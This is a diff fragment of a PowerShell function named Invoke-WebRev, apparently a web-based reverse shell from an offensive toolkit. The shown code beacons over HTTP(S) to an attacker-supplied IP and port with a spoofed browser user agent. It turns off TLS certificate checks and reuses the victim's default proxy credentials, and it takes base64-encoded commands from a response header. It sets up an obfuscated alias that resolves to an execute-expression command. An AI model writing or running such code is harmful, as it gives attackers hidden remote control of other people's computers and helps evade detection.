@@ -33,12 +33,14 @@ function Invoke-WebRev{
     if ($ssl) { $url="https://" + $ip + ":" + $port + "/"; } else { $url="http://" + $ip + ":" + $port + "/"; }
     $postParams = @{result='start'};
     $x = "taleska-ei-vrixeka"; Set-alias $x ($x[$true-10] + ($x[[byte]("0x" + "FF") - 265]) + $x[[byte]("0x" + "9a") - 158])
+    
+    (New-Object Net.WebClient).Proxy.Credentials=[Net.CredentialCache]::DefaultNetworkCredentials;
+    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
 
     while (1 -eq 1)
     {
         try
         {
-            [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
             $req = Invoke-WebRequest $url -UseBasicParsing -Method POST -Body $postParams -UserAgent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36";
             $header = $req.Headers["Authorization"];
             $c = [System.Convert]::FromBase64String($header);
